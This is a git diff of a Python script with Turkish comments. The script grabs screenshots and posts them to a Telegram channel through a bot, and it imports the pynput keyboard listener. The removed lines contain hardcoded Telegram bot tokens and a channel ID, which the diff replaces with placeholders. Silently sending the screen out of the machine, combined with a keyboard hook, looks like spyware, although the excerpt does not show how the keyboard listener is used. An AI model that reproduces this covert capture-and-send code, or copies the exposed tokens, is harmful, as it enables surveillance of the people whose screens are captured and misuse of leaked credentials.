@@ -4,6 +4,7 @@
 # pip3 install python-telegram-bot --upgrade
 # pip3 install pyscreenshot
 # pip3 install pillow
+# pip3 install pynput
 
 from telegram.ext import Updater
 from telegram.ext import CommandHandler
@@ -12,12 +13,11 @@ import pyscreenshot as ImageGrab
 import os
 import time
 
-
 from pdf import pdfYap
 from pynput import keyboard
-os.environ['TOKEN']='1142979898:AAEGJvOstfYNHLKMPYaclsIOx3YsHzjOUPw' #bilirkisi
 
-#os.environ['TOKEN']='980552993:AAH5DPFby37PpE8mhxpP6E_aUtKsj1OCgOA' #malumat
+os.environ['TOKEN']='buraya api key girilecek' 
+
 token = os.getenv('TOKEN')
 if not token:
     print("You need to export TOKEN=YOURTELEGRAMTOKEN")
@@ -27,7 +27,7 @@ updater = Updater(token=token)
 dispatcher = updater.dispatcher
 
 dosyaAdi = 1
-kanalID="-1001296358587"
+kanalID="buraya kanal id" #kanalID="-213542313"
 
 
 
@@ -40,7 +40,6 @@ def ekranYakala():
     return dosyaAdi
 
 def mesajYolla():
-    #updater.bot.send_message(chat_id="-367063764", text="test yayini1")
     dosyaAdi=ekranYakala()
     updater.bot.send_photo(chat_id=kanalID, photo=open(dosyaAdi, 'rb'))
 
